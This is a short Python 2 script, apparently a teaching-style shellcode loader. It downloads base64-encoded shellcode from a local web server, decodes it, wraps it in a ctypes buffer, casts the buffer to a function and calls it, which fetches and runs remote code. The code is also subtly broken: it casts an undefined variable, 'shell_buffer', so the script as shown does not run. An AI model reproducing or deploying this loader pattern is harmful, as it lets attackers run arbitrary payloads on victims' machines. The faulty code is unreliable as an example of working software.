#! -*- coding: utf-8 -*-

import urllib2, ctypes, base64

url = "http://localhost:8000/shellcode.bin"
response = urllib2.urlopen(url)

shellcode = base64.b64decode(response.read())

shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))

shellcode_func = ctypes.cast(shell_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))

shellcode_func()